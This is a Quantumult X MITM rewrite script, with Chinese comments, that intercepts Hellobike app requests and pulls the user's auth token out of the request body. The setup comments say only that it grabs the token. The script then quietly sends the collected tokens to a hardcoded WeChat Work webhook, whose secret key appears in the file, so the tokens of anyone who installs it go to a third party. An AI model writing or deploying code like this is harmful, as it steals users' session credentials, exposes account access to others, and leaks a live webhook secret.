/*
windows 命令窗口 输入 python -m http.server 8080
不要关掉！！！
===================

[rewrite_local]
^https?:\/\/api\.hellobike\.com\/api\?common\.welfare\.signAndRecommend$ url script-request-body https://raw.githubusercontent.com/fengyunjay2004/Lexus/refs/heads/main/hellobike.js

[mitm]
hostname = api.hellobike.com
===================
*/

if ($request) {
    let body = $request.body;  // 获取请求体
    let url = $request.url;
    
    // 定义10分钟的毫秒数
    const TEN_MINUTES = 10 * 60 * 1000;
    
    // 获取当前时间
    let currentTime = new Date().getTime();
    
    // 从本地缓存中获取之前存储的 token 列表和保存时间
    let cachedTokens = JSON.parse($prefs.valueForKey("tokenList") || "[]");  // 获取 token 列表，默认空数组
    let lastSavedTime = $prefs.valueForKey("tokenTime");
    
    // 检查缓存是否存在，且是否超过10分钟
    if (cachedTokens.length > 0 && lastSavedTime && (currentTime - lastSavedTime < TEN_MINUTES)) {
        console.log(`当前有效Token列表：${cachedTokens.join("@")}`);
    } else {
        // 如果超过10分钟，清除缓存
        if (lastSavedTime && currentTime - lastSavedTime >= TEN_MINUTES) {
            $prefs.removeValueForKey("tokenList");
            $prefs.removeValueForKey("tokenTime");
            $notify("Token 已清除", "", "超过10分钟，清除缓存");
            console.log("超过10分钟，Token 缓存已清除");
        }
    }

    // 检查是否为获取用户信息的请求
    if (url.indexOf("https://api.hellobike.com/api?common.welfare.signAndRecommend") !== -1) {
        // 提取请求体中的 token
        let tokenMatch = body.match(/"token":"([^"]+)"/);

        if (tokenMatch) {
            let newToken = tokenMatch[1];  // 获取当前 token 值

            // 将新 token 添加到列表中，如果之前不存在的话
            if (!cachedTokens.includes(newToken)) {
                cachedTokens.push(newToken);  // 添加新的 token 到数组
                $prefs.setValueForKey(JSON.stringify(cachedTokens), "tokenList");  // 保存 token 列表到本地存储
                $prefs.setValueForKey(currentTime, "tokenTime");  // 保存当前时间戳
                console.log(`新Token添加成功: ${newToken}`);
            } else {
                console.log("抓取到的 Token 已存在，跳过保存");
            }

            // 检查是否需要发送通知
            if (currentTime - lastSavedTime >= TEN_MINUTES || (cachedTokens.length === 1 && !lastSavedTime)) {
                // 发送合并的消息
                let wechatWebhookUrl = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=284b000b-784b-40b4-8a4a-893f4ab3b4b8"; 
                let wechatMessage = {
                    "msgtype": "text",
                    "text": {
                        "content": `hellobike 成功获取Token值\n${cachedTokens.join("@")}`
                    }
                };

                let options = {
                    url: wechatWebhookUrl,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(wechatMessage)
                };

                $task.fetch(options).then(response => {
                    console.log(`消息发送成功: ${response.body}`);
                    // 发送成功后更新保存时间
                    $prefs.setValueForKey(currentTime, "tokenTime");  // 更新保存时间
                    // 发送当前 Token 缓存的消息
                    sendCurrentTokenCache(cachedTokens);
                }, reason => {
                    console.log(`消息发送失败: ${reason.error}`);
                    sendCurrentTokenCache(cachedTokens); // 发送当前 Token 缓存，即使消息发送失败
                });
            } else {
                console.log(`当前Token缓存：${cachedTokens.join("@")}`);
                sendCurrentTokenCache(cachedTokens); // 发送当前 Token 缓存
            }
        } else {
            $notify("失败", "未找到 Token", "请检查请求体");  // 未找到 token 时通知
            $done();  // 未找到 token 时调用 $done()
        }
    } else {
        $done();  // URL 不匹配时调用 $done()
    }
}

// 函数用于发送当前Token缓存的消息
function sendCurrentTokenCache(tokens) {
    let wechatWebhookUrl = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=284b000b-784b-40b4-8a4a-893f4ab3b4b8";  
    let wechatMessage = {
        "msgtype": "text",
        "text": {
            "content": `hellobike当前Token缓存：\n\n${tokens.join("@")}`
        }
    };

    let options = {
        url: wechatWebhookUrl,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(wechatMessage)
    };

    $task.fetch(options).then(response => {
        console.log(`Token缓存消息发送成功: ${response.body}`);
        $done();  // 完成
    }, reason => {
        console.log(`Token缓存消息发送失败: ${reason.error}`);
        $done();  // 在消息发送失败后调用 $done()
    });
}
